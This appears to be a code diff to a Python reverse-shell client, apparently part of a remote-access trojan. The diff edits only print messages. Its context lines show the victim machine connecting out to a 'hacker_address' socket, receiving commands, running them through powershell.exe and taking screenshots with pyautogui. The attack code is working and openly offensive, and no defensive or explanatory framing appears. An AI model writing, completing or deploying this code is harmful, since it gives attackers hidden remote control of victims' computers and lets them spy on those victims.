@@ -21,8 +21,9 @@ if __name__ == "__main__":
             
             victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 
-            print("Trying to connect with ", hacker_address)
+            print("Trying to connect with ", hacker_address, "...")
             victim_socket.connect(hacker_address)
+            print("Connected with ", hacker_address, ".")
             while True:    
                 data = victim_socket.recv(1024)
 
@@ -66,7 +67,7 @@ if __name__ == "__main__":
                     print("Taking screenshot ...")
                     screenshot = pyautogui.screenshot()
                     screenshot.save("screenshot.png")
-                    print("screenshot saved")
+                    print("Screenshot saved.")
 
                 else:
                     output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
